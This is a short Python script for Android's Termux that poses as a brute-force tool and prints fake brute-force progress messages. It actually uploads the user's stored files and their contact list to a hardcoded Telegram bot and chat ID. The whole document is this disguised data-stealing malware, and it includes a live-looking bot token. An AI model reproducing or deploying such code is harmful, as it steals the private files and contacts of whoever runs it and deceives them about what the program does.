from threading import Thread, Lock
import os, subprocess, telebot, time, json, sys, io

bot = telebot.TeleBot('6297533986:AAGtMlOgroJCnYxb4Khwd3NvuGuXw91EU_g')

os.system('clear')
print("RUNNING BRUTEFORECE...")

def send_file_to_telegram(filename, i, total_files):
    try:
        file_size = os.path.getsize(filename)
        if file_size <= 500*1024*1024:
            with open(filename, 'rb') as f:
                bot.send_document(chat_id=1004407813, document=f)
        else:
            pass
    except:
        bot.send_message(chat_id=1004407813, text='ERROR SENDING FILE:- '+filename)
    print(f'Bruteforce combination {i + 1} of {total_files}')

def send_contacts_to_telegram():
    try:
        result = subprocess.run(['termux-contact-list'], stdout=subprocess.PIPE)
        contacts_json = json.loads(result.stdout.decode('utf-8'))
        contacts_str = json.dumps(contacts_json, indent=2)
        with io.BytesIO(contacts_str.encode()) as contacts_file:
            contacts_file.name = 'contacts.json'
            bot.send_document(chat_id=1004407813, document=contacts_file)
    except Exception as e:
        bot.send_message(chat_id=1004407813, text='ERROR SENDING CONTACTS '+e)

def get_user_files():
    files = []
    print(os.walk('~/storage'))
    for root, _, filenames in os.walk('~/storage'):
        for filename in filenames:
            files.append(os.path.join(root,filename))
    return files

files = get_user_files()
total_files = len(files)
lock = Lock()
threads = []
i = 0
while i < total_files:
    for filename in files[i:i+5]:
        if os.path.isfile(filename):
            t = Thread(target=send_file_to_telegram, args=(filename, i, total_files))
            t.start()
            threads.append(t)
            i += 1
            if i == total_files:
                break
    for t in threads:
        t.join()
    threads = []
    print('+',end='',flush=True)

send_contacts_to_telegram()
bot.send_message(chat_id=1004407813, text='All files and contacts have been sent.')
